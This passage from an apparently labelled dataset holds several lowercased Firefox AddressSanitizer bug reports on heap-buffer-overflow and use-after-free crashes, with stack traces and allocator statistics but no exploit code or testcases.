f9 f9 f9 f9 f9 f9 00 00 00 f9 f9 f9 f9 f9 00 f9 f9 f9 f9 f9 f9 f9 00 f9 f9 f9 f9 f9 f9 f9 00 f9 f9 f9 f9 f9 f9 f9	11
heap-buffer-overflow in nswavereader decodeaudiodata this bug was filed from the socorro interface and is report bp-edaabcc3-a4c5-4935-b00e-940a22120827 i m trying to minimize the testcase further and i ll add new testcase if i make any progress worth it asan-report from opt-build 10566 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 1 at thread t18 0 in nswavereader decodeaudiodata home/attekett/firefox/src/content/media/wave/nswavereader.cpp:192 is located 1 bytes to the right of 4096-byte region allocated by thread t18 here 0 in interceptor_malloc 0 1 in moz_xmalloc home/attekett/firefox/src/memory/mozalloc/mozalloc.cpp:57 thread t18 created by t17 here 0 in pthread_create 0 1 in pr_createthread home/attekett/firefox/src/nsprpub/pr/src/pthreads/ptthread.c:393 2 in pr_createthread home/attekett/firefox/src/nsprpub/pr/src/pthreads/ptthread.c:476 10566 aborting stats 329m malloced 591m for red zones by 1746645 calls stats 58m realloced by 20510 calls stats 256m freed by 217843 calls stats 97m really freed by 154806 calls stats 864m 221280 full pages mmaped in 209 calls mmaps by size class 8:1589151 9:32764 10:16380 11:16376 12:3072 13:1536 14:1280 15:256 16:384 17:1248 18:176 19:40 20:16 21:2 22:12 23:4 24:1 mallocs by size class 8:1664564 9:38223 10:17175 11:18265 12:2582 13:1803 14:1539 15:361 16:558 17:1303 18:195 19:41 20:17 21:2 22:12 23:4 24:1 frees by size class 8:153178 9:28974 10:13767 11:14943 12:1700 13:1601 14:1361 15:309 16:484 17:1289 18:169 19:40 20:15 21:2 22:11 rfrees by size class 8:114243 9:17260 10:9448 11:10197 12:972 13:748 14:839 15:190 16:184 17:695 18:25 19:4 20:1 stats malloc large 1575 small slow 4633 shadow byte and word fa fa fa fa fa fa fa fa fa more shadow bytes 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa	11
heap-use-after-free in nssmilanimationcontroller dosample reproduces on trunk reliable reproduce this by launching multiple instances of firefox with the same testcase on my fast box i needed like 15 10320 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t0 0 in pl_dhashtableenumerate src/objdir-ff-asan-sym/xpcom/build/pldhash.cpp:714 1 in nsthashtable nssmilcompositor enumerateentries pldhashoperator nssmilcompositor void void src dist/include/nsthashtable.h:237 2 in nssmilanimationcontroller dosample bool src/content/smil/nssmilanimationcontroller.cpp:437 3 in nssmilanimationcontroller resample src dist/include/nssmilanimationcontroller.h:66 4 in nssmilanimationcontroller flushresamplerequests src dist/include/nssmilanimationcontroller.h:84 5 in presshell flushpendingnotifications mozflushtype src/layout/base/nspresshell.cpp:3846 6 in nshideviewer run src/layout/generic/nssubdocumentframe.cpp:810 7 in nscontentutils removescriptblocker src/content/base/src/nscontentutils.cpp:4961 8 in nsautoscriptblocker src dist/include/nscontentutils.h:2276 9 in nsautoscriptblocker src dist/include/nscontentutils.h:2275 10 in nsdocument adoptnode nsidomnode nsidomnode src/content/base/src/nsdocument.cpp:6227 11 in nsidomdocument_adoptnode jscontext unsigned int js value src/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:3467 12 in js calljsnative jscontext int jscontext unsigned int js value js callargs const src/js/src/jscntxtinlines.h:372 13 in js interpret jscontext js stackframe js interpmode src/js/src/jsinterp.cpp:2413 14 in js runscript jscontext jsscript js stackframe src/js/src/jsinterp.cpp:309 15 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js stackframe js value src/js/src/jsinterp.cpp:494 16 in js execute jscontext js handle jsscript jsobject js value src/js/src/jsinterp.cpp:531 17 in js evaluate jscontext js handle jsobject js compileoptions unsigned short const unsigned long js value src/js/src/jsapi.cpp:5665 18 in js_evaluateucscriptforprincipalsversionorigin src/js/src/jsapi.cpp:5746 19 in nsjscontext evaluatestring nsastring_internal const jsobject nsiprincipal nsiprincipal char const unsigned int jsversion nsastring_internal bool src/dom/base/nsjsenvironment.cpp:1497 20 in nsglobalwindow runtimeouthandler nstimeout nsiscriptcontext src/dom/base/nsglobalwindow.cpp:9590 21 in nsglobalwindow runtimeout nstimeout src/dom/base/nsglobalwindow.cpp:9851 22 in nsglobalwindow timercallback nsitimer void src/dom/base/nsglobalwindow.cpp:10118 23 in nstimerimpl fire src/xpcom/threads/nstimerimpl.cpp:473 24 in nstimerevent run src/xpcom/threads/nstimerimpl.cpp:556 25 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:624 26 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 27 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 28 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:208 29 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:201 30 in messageloop run src/ipc/chromium/src/base/message_loop.cc:175 31 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 32 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:273 33 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3800 34 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3877 35 in xre_main src/toolkit/xre/nsapprunner.cpp:3953 36 in do_main int char src/browser/app/nsbrowserapp.cpp:174 37 in main src/browser/app/nsbrowserapp.cpp:279 38 in 0 is located 336 bytes inside of 896-byte region freed by thread t0 here 0 in free 0 1 in moz_free src/memory/mozalloc/mozalloc.cpp:51 2 in pl_dhashfreetable src/objdir-ff-asan-sym/xpcom/build/pldhash.cpp:88 3 in pl_dhashtablefinish src/objdir-ff-asan-sym/xpcom/build/pldhash.cpp:370 4 in nsthashtable src dist/include/nsthashtable.h:384 5 in nsthashtable src dist/include/nsthashtable.h:382 6 in nsautoptr nsthashtable nssmilcompositor assign nsthashtable nssmilcompositor src dist/include/nsautoptr.h:38 7 in nsautoptr nsthashtable nssmilcompositor operator nsthashtable nssmilcompositor src dist/include/nsautoptr.h:101 8 in nssmilanimationcontroller dosample bool src/content/smil/nssmilanimationcontroller.cpp:449 9 in nssmilanimationcontroller dosample src/content/smil/nssmilanimationcontroller.cpp:351 10 in nssmiltimecontainer sample src/content/smil/nssmiltimecontainer.cpp:176 11 in nssmilanimationcontroller resume unsigned int src/content/smil/nssmilanimationcontroller.cpp:94 12 in nssmilanimationcontroller onpageshow src/content/smil/nssmilanimationcontroller.cpp:193 13 in nsdocument onpageshow bool nsidomeventtarget src/content/base/src/nsdocument.cpp:7306 14 in documentviewerimpl loadcomplete unsigned int src/layout/base/nsdocumentviewer.cpp:1045 15 in nsdocshell endpageload nsiwebprogress nsichannel unsigned int src/docshell/base/nsdocshell.cpp:6415 16 in nsdocshell onstatechange nsiwebprogress nsirequest unsigned int unsigned int src/docshell/base/nsdocshell.cpp:6246 17 in non-virtual thunk to nsdocshell onstatechange nsiwebprogress nsirequest unsigned int unsigned int src/build/unix/stdc++compat/stdc++compat.cpp:0 18 in nsdocloader dofireonstatechange nsiwebprogress nsirequest int unsigned int src/uriloader/base/nsdocloader.cpp:1351 19 in nsdocloader dostopdocumentload nsirequest unsigned int src/uriloader/base/nsdocloader.cpp:931 20 in nsdocloader docloaderisempty bool src/uriloader/base/nsdocloader.cpp:820 21 in nsdocloader childdonewithonload nsidocumentloader src/uriloader/base/nsdocloader.h:193 22 in nsdocloader docloaderisempty bool src/uriloader/base/nsdocloader.cpp:823 23 in nsdocloader onstoprequest nsirequest nsisupports unsigned int src/uriloader/base/nsdocloader.cpp:704 24 in non-virtual thunk to nsdocloader onstoprequest nsirequest nsisupports unsigned int src/build/unix/stdc++compat/stdc++compat.cpp:0 25 in nsloadgroup removerequest nsirequest nsisupports unsigned int src/netwerk/base/src/nsloadgroup.cpp:698 26 in nsloadgroup cancel unsigned int src/netwerk/base/src/nsloadgroup.cpp:304 27 in nsdocloader stop src/uriloader/base/nsdocloader.cpp:328 28 in nsdocshell stop src/docshell/base/nsdocshell.h:189 29 in nsdocshell stop unsigned int src/docshell/base/nsdocshell.cpp:4541 previously allocated by thread t0 here 0 in interceptor_malloc 0 1 in moz_malloc src/memory/mozalloc/mozalloc.cpp:67 2 in pl_dhashalloctable src/objdir-ff-asan-sym/xpcom/build/pldhash.cpp:82 3 in pl_dhashtableinit src/objdir-ff-asan-sym/xpcom/build/pldhash.cpp:229 4 in nsthashtable nssmilcompositor init unsigned int mozilla fallible_t const src dist/include/nsthashtable.h:414 5 in nsthashtable nssmilcompositor init unsigned int src dist/include/nsthashtable.h:98 6 in nssmilanimationcontroller dosample bool src/content/smil/nssmilanimationcontroller.cpp:413 7 in nssmilanimationcontroller resample src dist/include/nssmilanimationcontroller.h:66 8 in nssmilanimationcontroller flushresamplerequests src dist/include/nssmilanimationcontroller.h:84 9 in presshell flushpendingnotifications mozflushtype src/layout/base/nspresshell.cpp:3846 10 in nsrefreshdriver notify nsitimer src/layout/base/nsrefreshdriver.cpp:378 11 in nstimerimpl fire src/xpcom/threads/nstimerimpl.cpp:476 12 in nstimerevent run src/xpcom/threads/nstimerimpl.cpp:556 13 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:624 14 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 15 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 16 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:208 17 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:201 18 in messageloop run src/ipc/chromium/src/base/message_loop.cc:175 19 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 20 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:273 21 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3800 22 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3877 23 in xre_main src/toolkit/xre/nsapprunner.cpp:3953 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd stats 220m malloced 219m for red zones by 289499 calls stats 41m realloced by 14348 calls stats 192m freed by 181706 calls stats 57m really freed by 116880 calls stats 412m 105547 full pages mmaped in 103 calls mmaps by size class 8:196596 9:40955 10:16380 11:14329 12:2048 13:1536 14:1280 15:256 16:320 17:1248 18:160 19:40 20:16 mallocs by size class 8:205900 9:44146 10:15477 11:16402 12:2266 13:1677 14:1399 15:305 16:403 17:1293 18:173 19:41 20:17 frees by size class 8:114002 9:35563 10:12435 11:13502 12:1490 13:1439 14:1233 15:266 16:306 17:1281 18:136 19:39 20:14 rfrees by size class 8:78488 9:19256 10:8038 11:9093 12:676 13:448 14:316 15:147 16:183 17:201 18:28 19:5 20:1 stats malloc large 1524 small slow 1617 10320 aborting	11
heap-use-after-free in xpcwrappednative mark this reproduces on trunk and hitting quite frequently with flaky test i am trying to get a reliable testcase 24146 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in xpcwrappednative mark const src/js/xpconnect/src/xpcprivate.h:2836 1 in wrappednativemarker jsdhashtable jsdhashentryhdr unsigned int void src/js/xpconnect/src/xpcwrappednativescope.cpp:433 2 in js_dhashtableenumerate src/js/src/jsdhash.cpp:710 3 in native2wrappednativemap enumerate jsdhashoperator jsdhashtable jsdhashentryhdr unsigned int void void src/js/xpconnect/src/xpcmaps.h:137 4 in xpcwrappednativescope markallwrappednativesandprotos src/js/xpconnect/src/xpcwrappednativescope.cpp:452 5 in xpcjsruntime finalizecallback jsfreeop jsfinalizestatus int src/js/xpconnect/src/xpcjsruntime.cpp:792 6 in beginsweepphase jsruntime src/js/src/jsgc.cpp:3779 7 in incrementalcollectslice jsruntime long js gcreason reason js jsgcinvocationkind src/js/src/jsgc.cpp:4214 8 in gccycle jsruntime bool long js jsgcinvocationkind js gcreason reason src/js/src/jsgc.cpp:4392 9 in collect jsruntime bool long js jsgcinvocationkind js gcreason reason src/js/src/jsgc.cpp:4500 10 in js gcslice jsruntime js jsgcinvocationkind js gcreason reason long src/js/src/jsgc.cpp:4538 11 in js incrementalgc jsruntime js gcreason reason long src/js/src/jsfriendapi.cpp:171 12 in nsjscontext garbagecollectnow js gcreason reason nsjscontext isincremental nsjscontext iscompartment nsjscontext isshrinking long src/dom/base/nsjsenvironment.cpp:2922 13 in interslicegctimerfired nsitimer void src/dom/base/nsjsenvironment.cpp:3204 14 in nstimerimpl fire src/xpcom/threads/nstimerimpl.cpp:473 15 in nstimerevent run src/xpcom/threads/nstimerimpl.cpp:556 16 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:624 17 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 18 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:117 19 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:208 20 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:201 21 in messageloop run src/ipc/chromium/src/base/message_loop.cc:175 22 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 23 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:273 24 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3800 25 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3877 26 in xre_main src/toolkit/xre/nsapprunner.cpp:3953 27 in do_main int char src/browser/app/nsbrowserapp.cpp:174 28 in main src/browser/app/nsbrowserapp.cpp:279 29 in 0 is located 32 bytes inside of 96-byte region freed by thread t0 here 0 in free 0 1 in moz_free src/memory/mozalloc/mozalloc.cpp:51 2 in operator delete void src dist/include/mozilla/mozalloc.h:224 3 in xpcwrappednative release src/js/xpconnect/src/xpcwrappednative.cpp:1214 4 in xpcwrappednative flatjsobjectfinalized src/js/xpconnect/src/xpcwrappednative.cpp:1338 5 in wrappednativefinalize js freeop jsobject wnhelpertype src/js/xpconnect/src/xpcwrappednativejsops.cpp:617 6 in xpc_wn_nohelper_finalize js freeop jsobject src/js/xpconnect/src/xpcwrappednativejsops.cpp:623 7 in jsobject finalize js freeop src/js/src/jsobjinlines.h:235 8 in bool js gc finalizetypedarenas jsobject js freeop js gc arenaheader js gc arenalist js gc allockind js slicebudget src/js/src/jsgc.cpp:412 9 in js gc finalizearenas js freeop js gc arenaheader js gc arenalist js gc allockind js slicebudget src/js/src/jsgc.cpp:449 10 in js gc arenalists finalizenow js freeop js gc allockind src/js/src/jsgc.cpp:1626 11 in js gc arenalists queueobjectsforsweep js freeop src/js/src/jsgc.cpp:1722 12 in beginsweepphase jsruntime src/js/src/jsgc.cpp:3750 13 in incrementalcollectslice jsruntime long js gcreason reason js jsgcinvocationkind src/js/src/jsgc.cpp:4214 14 in gccycle jsruntime bool long js jsgcinvocationkind js gcreason reason src/js/src/jsgc.cpp:4392 15 in collect jsruntime bool long js jsgcinvocationkind js gcreason reason src/js/src/jsgc.cpp:4500 16 in js gcslice jsruntime js jsgcinvocationkind js gcreason reason long src/js/src/jsgc.cpp:4538 17 in js incrementalgc jsruntime js gcreason reason long src/js/src/jsfriendapi.cpp:171 18 in nsjscontext garbagecollectnow js gcreason reason nsjscontext isincremental nsjscontext iscompartment nsjscontext isshrinking long src/dom/base/nsjsenvironment.cpp:2922 19 in interslicegctimerfired nsitimer void src/dom/base/nsjsenvironment.cpp:3204 20 in nstimerimpl fire src/xpcom/threads/nstimerimpl.cpp:473 21 in nstimerevent run src/xpcom/threads/nstimerimpl.cpp:556 22 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:624 23 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 24 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:117 25 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:208 26 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:201 27 in messageloop run src/ipc/chromium/src/base/message_loop.cc:175 28 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 29 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:273 previously allocated by thread t0 here 0 in interceptor_malloc 0 1 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:57 2 in operator new unsigned long src dist/include/mozilla/mozalloc.h:200 3 in xpcconvert nativeinterface2jsobject xpclazycallcontext js value nsixpconnectjsobjectholder xpcobjecthelper nsid const xpcnativeinterface bool unsigned int src/js/xpconnect/src/xpcconvert.cpp:920 4 in xpcconvert nativedata2js xpclazycallcontext js value void const nsxpttype const nsid const unsigned int src/js/xpconnect/src/xpcconvert.cpp:319 5 in xpcconvert nativedata2js xpccallcontext js value void const nsxpttype const nsid const unsigned int src/js/xpconnect/src/xpcprivate.h:3310 6 in callmethodhelper gatherandconvertresults src/js/xpconnect/src/xpcwrappednative.cpp:2642 7 in xpc_wn_callmethod jscontext unsigned int js value src/js/xpconnect/src/xpcwrappednativejsops.cpp:1478 8 in js calljsnative jscontext int jscontext unsigned int js value js callargs const src/js/src/jscntxtinlines.h:372 9 in js interpret jscontext js stackframe js interpmode src/js/src/jsinterp.cpp:2413 10 in js runscript jscontext jsscript js stackframe src/js/src/jsinterp.cpp:309 11 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js stackframe js value src/js/src/jsinterp.cpp:494 12 in js execute jscontext js handle jsscript jsobject js value src/js/src/jsinterp.cpp:531 13 in js evaluate jscontext js handle jsobject js compileoptions unsigned short const unsigned long js value src/js/src/jsapi.cpp:5665 14 in js_evaluateucscriptforprincipalsversionorigin src/js/src/jsapi.cpp:5746 15 in nsjscontext evaluatestring nsastring_internal const jsobject nsiprincipal nsiprincipal char const unsigned int jsversion nsastring_internal bool src/dom/base/nsjsenvironment.cpp:1497 16 in nsglobalwindow runtimeouthandler nstimeout nsiscriptcontext src/dom/base/nsglobalwindow.cpp:9590 17 in nsglobalwindow runtimeout nstimeout src/dom/base/nsglobalwindow.cpp:9851 18 in nsglobalwindow timercallback nsitimer void src/dom/base/nsglobalwindow.cpp:10118 19 in nstimerimpl fire src/xpcom/threads/nstimerimpl.cpp:473 20 in nstimerevent run src/xpcom/threads/nstimerimpl.cpp:556 21 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:624 22 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 23 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 24 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:209 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes 00 00 00 00 00 00 00 00 fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd stats 287m malloced 327m for red zones by 649602 calls stats 79m realloced by 89263 calls stats 248m freed by 411873 calls stats 117m really freed by 185135 calls stats 532m 136282 full pages mmaped in 133 calls mmaps by size class 8:442341 9:40955 10:16380 11:14329 12:3072 13:1536 14:1280 15:256 16:448 17:1248 18:208 19:104 20:20 mallocs by size class 8:550715 9:52926 10:18484 11:17824 12:3165 13:2149 14:1685 15:376 16:564 17:1361 18:228 19:106 20:19 frees by size class 8:331303 9:43136 10:15020 11:14592 12:2157 13:1812 14:1407 15:329 16:504 17:1346 18:149 19:103 20:15 rfrees by size class 8:136366 9:24837 10:9558 11:10277 12:996 13:829 14:830 15:183 16:354 17:869 18:30 19:5 20:1 stats malloc large 1714 small slow 2570 24146 aborting	11
heap-use-after-free in domsvgtests getrequiredfeatures reproduces on trunk do n't have reliable testcase but this is hitting every now and then i got it once under a fully symbolized build that might give an idea of the problem as i get the reliable testcase i will attach it soon this hits in both domsvgtests getrequiredfeatures and domsvgtests getrequiredextensions 1718 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nscyclecollectingautorefcnt incr void src dist/include/nsisupportsimpl.h:108 1 in mozilla domsvgstringlist addref src/content/svg/content/src/domsvgstringlist.cpp:21 2 in nsrefptr src dist/include/nsautoptr.h:898 3 in nsrefptr src dist/include/nsautoptr.h:899 4 in mozilla domsvgstringlist getdomwrapper mozilla svgstringlist nssvgelement bool unsigned char src/content/svg/content/src/domsvgstringlist.cpp:43 5 in domsvgtests getrequiredfeatures nsidomsvgstringlist src/content/svg/content/src/domsvgtests.cpp:33 6 in ns_invokebyindex_p src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 7 in callmethodhelper invoke src/js/xpconnect/src/xpcwrappednative.cpp:3105 8 in xpcwrappednative getattribute xpccallcontext src/js/xpconnect/src/xpcprivate.h:2817 9 in xpc_wn_gettersetter jscontext unsigned int js value src/js/xpconnect/src/xpcwrappednativejsops.cpp:1518 10 in js calljsnative jscontext int jscontext unsigned int js value js callargs const src/js/src/jscntxtinlines.h:372 11 in js invoke jscontext js invokeargsguard js maybeconstruct src/js/src/jsinterp.h:119 12 in js invoke jscontext js value const js value const unsigned int js value js value src/js/src/jsinterp.cpp:388 13 in js invokegetterorsetter jscontext jsobject js value const unsigned int js value js value src/js/src/jsinterp.cpp:461 14 in js shape get jscontext js handle jsobject jsobject jsobject js mutablehandle js value src/js/src/jsscopeinlines.h:296 15 in js_nativegetinline jscontext js handle jsobject jsobject jsobject js shape unsigned int js value src/js/src/jsobj.cpp:4461 16 in jsobject getgeneric jscontext js handle jsobject js handle jsobject js handle long js mutablehandle js value src/js/src/jsobjinlines.h:173 17 in jsobject getproperty jscontext js handle jsobject js handle jsobject js propertyname js mutablehandle js value src/js/src/jsobjinlines.h:184 18 in js getobjectelementoperation jscontext jsop js handle jsobject js value const js mutablehandle js value src/js/src/jsinterpinlines.h:713 19 in js runscript jscontext jsscript js stackframe src/js/src/jsinterp.cpp:301 20 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js stackframe js value src/js/src/jsinterp.cpp:486 21 in js execute jscontext js handle jsscript jsobject js value src/js/src/jsinterp.cpp:523 22 in js evaluate jscontext js handle jsobject js compileoptions unsigned short const unsigned long js value src/js/src/jsapi.cpp:5673 23 in nsjscontext evaluatestring nsastring_internal const jsobject nsiprincipal nsiprincipal char const unsigned int jsversion nsastring_internal bool src/dom/base/nsjsenvironment.cpp:1499 24 in nsglobalwindow runtimeouthandler nstimeout nsiscriptcontext src/dom/base/nsglobalwindow.cpp:9590 25 in nsglobalwindow runtimeout nstimeout src/dom/base/nsglobalwindow.cpp:9851 26 in nsglobalwindow timercallback nsitimer void src/dom/base/nsglobalwindow.cpp:10118 27 in nstimerimpl fire src/xpcom/threads/nstimerimpl.cpp:473 28 in nstimerevent run src/xpcom/threads/nstimerimpl.cpp:556 29 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:624 30 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 31 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 32 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:208 33 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:201 34 in messageloop run src/ipc/chromium/src/base/message_loop.cc:175 35 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 36 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:273 37 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3835 38 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3912 39 in xre_main src/toolkit/xre/nsapprunner.cpp:3988 40 in do_main int char src/browser/app/nsbrowserapp.cpp:174 41 in main src/browser/app/nsbrowserapp.cpp:279 42 in 0 is located 8 bytes inside of 32-byte region freed by thread t0 here 0 in free 0 1 in moz_free src/memory/mozalloc/mozalloc.cpp:51 2 in operator delete void src dist/include/mozilla/mozalloc.h:224 3 in zl17dodeferredreleaseip11nsisupportsevr8nstarrayit_24nstarraydefaultallocatore src/js/xpconnect/src/xpcjsruntime.cpp:564 4 in xpcjsruntime gccallback jsruntime jsgcstatus src/js/xpconnect/src/xpcjsruntime.cpp:718 5 in collect jsruntime bool long js jsgcinvocationkind js gcreason reason src/js/src/jsgc.cpp:4505 6 in js gcfinalslice jsruntime js jsgcinvocationkind js gcreason reason src/js/src/jsgc.cpp:4544 7 in js finishincrementalgc jsruntime js gcreason reason src/js/src/jsfriendapi.cpp:177 8 in js_transplantobject src/js/src/jsapi.cpp:1570 9 in xpc transplantobject jscontext jsobject jsobject src/js/xpconnect/wrappers/wrapperfactory.cpp:674 10 in xpcwrappednative reparentwrapperiffound xpccallcontext xpcwrappednativescope xpcwrappednativescope jsobject nsisupports xpcwrappednative src/js/xpconnect/src/xpcwrappednative.cpp:1669 11 in nsxpconnect reparentwrappednativeiffound jscontext jsobject jsobject nsisupports nsixpconnectjsobjectholder src/js/xpconnect/src/nsxpconnect.cpp:1531 12 in nsnodeutils cloneandadopt nsinode bool bool nsnodeinfomanager jscontext jsobject nscomarray nsinode nsinode nsinode src/content/base/src/nsnodeutils.cpp:537 13 in nsnodeutils cloneandadopt nsinode bool bool nsnodeinfomanager jscontext jsobject nscomarray nsinode nsidomnode src dist/include/nsnodeutils.h:282 14 in nsnodeutils adopt nsinode nsnodeinfomanager jscontext jsobject nscomarray nsinode src/content/base/src/nsnodeutils.h:182 15 in nsdocument adoptnode nsidomnode nsidomnode src/content/base/src/nsdocument.cpp:6169 16 in nshtmldocument adoptnode nsidomnode nsidomnode src/content/html/document/src/nshtmldocument.h:87 17 in non-virtual thunk to nshtmldocument adoptnode nsidomnode nsidomnode src/gfx/cairo/cairo/src/cairo-surface-subsurface.c:0 18 in adoptnodeintoownerdoc nsinode nsinode src/content/base/src/nsinode.cpp:1257 19 in nsinode replaceorinsertbefore bool nsinode nsinode src/content/base/src/nsinode.cpp:1809 20 in nsinode replaceorinsertbefore bool nsinode nsinode unsigned int src dist/include/nsinode.h:1464 21 in nsinode insertbefore nsinode nsinode unsigned int src dist/include/nsinode.h:488 22 in nsinode appendchild nsinode unsigned int src dist/include/nsinode.h:498 23 in nsidomnode_appendchild jscontext unsigned int js value src/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:5531 24 in js calljsnative jscontext int jscontext unsigned int js value js callargs const src/js/src/jscntxtinlines.h:372 25 in js interpret jscontext js stackframe js interpmode src/js/src/jsinterp.cpp:2405 26 in js runscript jscontext jsscript js stackframe src/js/src/jsinterp.cpp:301 27 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js stackframe js value src/js/src/jsinterp.cpp:486 28 in js execute jscontext js handle jsscript jsobject js value src/js/src/jsinterp.cpp:523 29 in js evaluate jscontext js handle jsobject js compileoptions unsigned short const unsigned long js value src/js/src/jsapi.cpp:5673 previously allocated by thread t0 here 0 in interceptor_malloc 0 1 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:57 2 in operator new unsigned long src dist/include/mozilla/mozalloc.h:200 3 in domsvgtests getrequiredfeatures nsidomsvgstringlist src/content/svg/content/src/domsvgtests.cpp:33 4 in ns_invokebyindex_p src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 5 in callmethodhelper invoke src/js/xpconnect/src/xpcwrappednative.cpp:3105 6 in xpcwrappednative getattribute xpccallcontext src/js/xpconnect/src/xpcprivate.h:2817 7 in xpc_wn_gettersetter jscontext unsigned int js value src/js/xpconnect/src/xpcwrappednativejsops.cpp:1518 8 in js calljsnative jscontext int jscontext unsigned int js value js callargs const src/js/src/jscntxtinlines.h:372 9 in js invoke jscontext js invokeargsguard js maybeconstruct src/js/src/jsinterp.h:119 10 in js invoke jscontext js value const js value const unsigned int js value js value src/js/src/jsinterp.cpp:388 11 in js invokegetterorsetter jscontext jsobject js value const unsigned int js value js value src/js/src/jsinterp.cpp:461 12 in js shape get jscontext js handle jsobject jsobject jsobject js mutablehandle js value src/js/src/jsscopeinlines.h:296 13 in js_nativegetinline jscontext js handle jsobject jsobject jsobject js shape unsigned int js value src/js/src/jsobj.cpp:4461 14 in jsobject getgeneric jscontext js handle jsobject js handle jsobject js handle long js mutablehandle js value src/js/src/jsobjinlines.h:173 15 in jsobject getproperty jscontext js handle jsobject js handle jsobject js propertyname js mutablehandle js value src/js/src/jsobjinlines.h:184 16 in js getobjectelementoperation jscontext jsop js handle jsobject js value const js mutablehandle js value src/js/src/jsinterpinlines.h:713 17 in js runscript jscontext jsscript js stackframe src/js/src/jsinterp.cpp:301 18 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js stackframe js value src/js/src/jsinterp.cpp:486 19 in js execute jscontext js handle jsscript jsobject js value src/js/src/jsinterp.cpp:523 20 in js evaluate jscontext js handle jsobject js compileoptions unsigned short const unsigned long js value src/js/src/jsapi.cpp:5673 21 in nsjscontext evaluatestring nsastring_internal const jsobject nsiprincipal nsiprincipal char const unsigned int jsversion nsastring_internal bool src/dom/base/nsjsenvironment.cpp:1499 22 in nsglobalwindow runtimeouthandler nstimeout nsiscriptcontext src/dom/base/nsglobalwindow.cpp:9590 23 in nsglobalwindow runtimeout nstimeout 